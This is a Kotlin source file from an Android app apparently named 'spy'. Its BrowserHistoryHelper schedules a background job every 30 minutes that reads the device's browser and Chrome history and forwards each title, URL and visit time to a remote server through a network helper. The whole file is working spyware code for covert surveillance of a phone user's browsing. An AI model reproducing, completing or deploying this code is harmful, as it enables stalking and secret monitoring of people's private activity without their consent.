package com.gauravhanna.spy

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.Browser
import android.util.Log
import androidx.work.*
import java.util.concurrent.TimeUnit

object BrowserHistoryHelper {
    private const val TAG = "BrowserHistoryHelper"
    private var lastHistoryTimestamp = 0L

    fun start(context: Context) {
        // Using WorkManager instead of scheduleAtFixedRate
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val historyWork = PeriodicWorkRequestBuilder<BrowserHistoryWorker>(
            30, TimeUnit.MINUTES
        ).setConstraints(constraints).build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            "browser_history_work",
            ExistingPeriodicWorkPolicy.KEEP,
            historyWork
        )

        Log.d(TAG, "BrowserHistoryHelper started")
    }

    fun forceSync(context: Context) {
        val workRequest = OneTimeWorkRequestBuilder<BrowserHistoryWorker>()
            .build()
        WorkManager.getInstance(context).enqueue(workRequest)
    }

    // Worker class for WorkManager
    class BrowserHistoryWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
        override fun doWork(): Result {
            return try {
                collectBrowserHistory(applicationContext)
                Result.success()
            } catch (e: Exception) {
                Log.e(TAG, "History collection failed: ${e.message}")
                Result.retry()
            }
        }
    }

    private fun collectBrowserHistory(context: Context) {
        try {
            // Using content URI for browser history (works on most Android versions)
            val historyUri = Uri.parse("content://browser/bookmarks")

            val projection = arrayOf(
                "title",      // BookmarkColumns.TITLE
                "url",        // BookmarkColumns.URL
                "date",       // BookmarkColumns.DATE
                "visits"      // BookmarkColumns.VISITS
            )

            val selection = "bookmark = 0 AND date > ?"
            val selectionArgs = arrayOf(lastHistoryTimestamp.toString())

            val cursor = context.contentResolver.query(
                historyUri,
                projection,
                selection,
                selectionArgs,
                "date DESC LIMIT 100"
            )

            cursor?.use {
                val titleCol = it.getColumnIndex("title")
                val urlCol = it.getColumnIndex("url")
                val dateCol = it.getColumnIndex("date")

                while (it.moveToNext()) {
                    val title = if (titleCol >= 0) it.getString(titleCol) ?: "" else ""
                    val url = if (urlCol >= 0) it.getString(urlCol) ?: "" else ""
                    val date = if (dateCol >= 0) it.getLong(dateCol) else 0L

                    if (url.isNotEmpty() && date > lastHistoryTimestamp) {
                        NetworkHelper.sendBrowserHistory(context, title, url, date)
                        if (date > lastHistoryTimestamp) lastHistoryTimestamp = date
                        Log.d(TAG, "📊 Browser history: ${title.take(50)}")
                    }
                }
            }

            // Alternative: Try Chrome history
            collectChromeHistory(context)

        } catch (e: Exception) {
            Log.e(TAG, "Error collecting browser history: ${e.message}")
        }
    }

    private fun collectChromeHistory(context: Context) {
        try {
            val chromeUri = Uri.parse("content://com.android.chrome.browser/history")
            val cursor = context.contentResolver.query(
                chromeUri,
                arrayOf("title", "url", "last_visit_time"),
                null,
                null,
                "last_visit_time DESC LIMIT 50"
            )

            cursor?.use {
                val titleCol = it.getColumnIndex("title")
                val urlCol = it.getColumnIndex("url")
                val dateCol = it.getColumnIndex("last_visit_time")

                while (it.moveToNext()) {
                    val title = if (titleCol >= 0) it.getString(titleCol) ?: "" else ""
                    val url = if (urlCol >= 0) it.getString(urlCol) ?: "" else ""
                    val date = if (dateCol >= 0) it.getLong(dateCol) else 0L

                    if (url.isNotEmpty()) {
                        NetworkHelper.sendBrowserHistory(context, title, url, date)
                        Log.d(TAG, "📊 Chrome history: ${title.take(50)}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.d(TAG, "Chrome history not accessible: ${e.message}")
        }
    }
}